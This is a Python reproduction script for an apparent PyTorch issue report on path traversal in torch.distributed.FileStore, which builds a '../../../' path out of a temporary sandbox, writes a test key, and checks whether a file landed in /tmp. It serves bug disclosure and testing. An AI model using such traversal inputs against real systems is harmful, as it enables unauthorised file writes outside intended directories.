# https://github.com/pytorch/pytorch/issues/176276
#
# SECURITY BUG: Path Traversal in torch.distributed.FileStore
#
# FileStore allows writing files outside intended directories through path traversal
# attacks. This can lead to arbitrary file writes depending on process permissions.
#
# Impact: In distributed training setups where FileStore paths are derived from
# external input, this may lead to unintended file modification.
#
# Run with: python repros/issue_176276.py

import os
import tempfile
import torch.distributed as dist

def main():
    print("=== Testing FileStore Path Traversal Vulnerability ===")

    # Create a sandbox directory
    sandbox = tempfile.mkdtemp(prefix="filestore_sandbox_")
    print(f"Sandbox directory: {sandbox}")

    # Target file outside the sandbox
    escape_target = "/tmp/pytorch_filestore_escape_test.txt"

    # Create path traversal attack string
    traversal_path = os.path.join(sandbox, "../../../", escape_target.lstrip("/"))
    print(f"FileStore path argument: {traversal_path}")
    print(f"Resolved path: {os.path.realpath(traversal_path)}")

    try:
        # Attempt path traversal via FileStore
        print("\nAttempting path traversal attack...")
        store = dist.FileStore(traversal_path, 1)
        store.set("test_key", "SECURITY_TEST_CONTENT")

        # Check if file was written outside sandbox
        if os.path.exists(escape_target):
            print("🚨 SECURITY BUG REPRODUCED: FileStore wrote outside the sandbox!")
            print(f"Escaped file exists at: {escape_target}")

            try:
                with open(escape_target, 'r') as f:
                    content = f.read()
                print(f"File content: {content}")
            except Exception as e:
                print(f"Could not read escaped file: {e}")

            # Cleanup
            try:
                os.remove(escape_target)
                print("Cleaned up escaped file")
            except:
                pass
        else:
            print("✅ No escaped file detected - vulnerability may be fixed")

    except Exception as e:
        print(f"FileStore operation failed: {type(e).__name__}: {e}")
        print("This could indicate the vulnerability is fixed or access is restricted")

    finally:
        # Cleanup sandbox
        try:
            import shutil
            shutil.rmtree(sandbox)
            print(f"Cleaned up sandbox directory: {sandbox}")
        except:
            pass

if __name__ == "__main__":
    main()